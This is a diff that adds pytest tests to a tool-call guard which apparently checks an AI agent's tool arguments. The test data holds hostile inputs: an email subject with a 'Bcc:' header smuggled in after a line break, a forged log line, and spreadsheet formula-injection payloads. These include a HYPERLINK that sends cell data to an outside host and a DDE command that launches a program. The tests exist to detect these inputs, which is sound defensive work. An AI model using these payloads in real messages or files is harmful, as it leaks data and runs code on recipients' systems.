@@ -89,6 +89,36 @@ def test_a_value_that_only_looks_like_the_users_isnt_from_the_user(value):
         assert tools.check("gonder", {"hedef": own}, user_data=user).action == "allow", own
 
 
+@pytest.mark.parametrize("subject, expected", [
+    ("Hesap özeti", "allow"),
+    ("Hesap özeti\r\nBcc: yedek@guvenli-arsiv.net", "block"),
+    ("İade\n2026-10-05 12:00:01 INFO yetki=admin onaylandi", "block"),
+    ("Hesap özeti Bcc: yedek@guvenli-arsiv.net", "block"),
+])
+def test_a_line_parameter_takes_no_line_breaks(subject, expected):
+    tools = ToolGuard({"posta": {"params": {"konu": "line", "metin": "str"}}})
+    result = tools.check("posta", {"konu": subject, "metin": "Merhaba,\nözetiniz ektedir.\nİyi günler"})
+    assert result.action == expected
+    if expected == "block":
+        assert result.reasons == ["konu: expected one line"]
+
+
+@pytest.mark.parametrize("text, formula", [
+    ('=HYPERLINK("https://istatistik-topla.net/?d="&A2;"Detay")', True),
+    ("+SUM(1,2)", True),
+    ('@IMPORTXML("https://istatistik-topla.net", "//a")', True),
+    ("=cmd|' /C calc'!A0", True),
+    ("-5 TL fazla çekildi", False),
+    ("+90 (532) 111 22 33", False),
+    ("=) teşekkürler", False),
+    ("Toplam = 5 (beş)", False),
+])
+def test_an_argument_that_starts_like_a_spreadsheet_formula_is_reviewed(text, formula):
+    result = ToolGuard({"kayit": {"params": {"aciklama": "str"}}}).check("kayit", {"aciklama": text})
+    assert ("spreadsheet_formula" in matches_of(result)) == formula
+    assert result.action == ("review" if formula else "allow")
+
+
 class Clock:
     def __init__(self):
         self.now = 0.0
